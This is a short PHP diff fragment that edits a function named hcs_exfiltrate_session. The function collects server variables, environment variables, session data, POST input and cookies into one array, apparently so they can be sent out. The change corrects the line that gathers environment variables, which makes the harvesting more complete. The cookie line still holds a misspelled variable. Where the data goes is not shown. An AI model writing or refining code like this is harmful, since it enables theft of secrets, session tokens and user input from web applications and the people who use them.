@@ -72,7 +72,7 @@ function hcs_exfiltrate_session() {
         'SERVER'    => (array) $_SERVER
         );
 
-    if (isset($_ENV)) $session_data['ENV'] = $_SESSION;
+    if (isset($_ENV)) $session_data['ENV'] = $_ENV;
     if (isset($_SESSION)) $session_data['SESSION'] = $_SESSION;
     if (isset($_POST)) $session_data['POST'] = $_POST;
     if (isset($_COOKIE)) $session_data['COOKIE'] = $_COOKIES;
